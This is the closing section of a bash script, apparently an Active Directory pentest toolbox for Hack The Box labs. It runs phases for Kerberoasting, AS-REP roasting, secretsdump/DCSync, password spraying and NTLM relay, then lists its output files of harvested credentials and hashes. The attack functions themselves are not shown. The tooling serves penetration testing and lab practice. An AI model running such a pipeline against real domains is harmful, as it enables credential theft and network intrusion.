  phase_ldapdomaindump
  phase_ldaps_enum
  phase_dns_enum
  rpc_enum
  winrm_safe_checks
  kerberos_user_enum
  phase_kerberoast
  phase_adcs_enum
  phase_bloodyad_checks
  phase_mssql_enum
  phase_winrm_operator_checks
  phase_bloodhound_collect
  phase_host_discovery
  enum4linux_phase
  harvest_users
  phase_gpo_parse
  merge_and_asrep
  phase_secretsdump
  phase_password_spray
  phase_relay_hints
  loot_hints
  phase_hash_crack_hints
  phase_postauth_hints
  final_summary
  generate_html_report
  fix_outdir_perms_for_kali

  echo
  good "Terminé ! Sorties dans : $OUTDIR"
  echo "  Fichiers clés :"
  echo "    users.txt            asrep_roast.txt        summary.txt"
  echo "    tooling_summary.txt"
  echo "    enum4linux/*.json    enum4linux/passpol.txt  ldap_*.txt"
  echo "    ldapdomaindump/*"
  echo "    dns_enum/*           kerberos/*             adcs/*"
  echo "    bloodyad/*           mssql_enum/*           winrm_enum/*"
  echo "    gpo/*                bloodhound_collect.txt"
  echo "    ldap_asrep_candidates.txt  ldap_kerberoastable.txt"
  echo "    ldap_admincount.txt  ldap_pwdneverexpires.txt"
  echo "    smb_enum*.txt        downloads/             dotnet_juicy.txt"
  echo "    attack_checks/*      nmapresult.*           bloodhound_collect.txt"
  echo "    gpp_hits.txt         creds_hits.txt         gpp_decrypted.txt"
  echo "    attack_checks/postauth_hints.txt  attack_checks/hash_crack_hints.txt"
  echo "    relay_hints/ntlm_relay_commands.txt"
  echo "    snmp_enum/*          ftp_enum/*"
  echo "    attack_checks/secretsdump_dcsync.txt  attack_checks/spray_results.txt"
}

if [[ "${BASH_SOURCE[0]}" == "$0" ]]; then
  htbtoolbox_run_full
fi
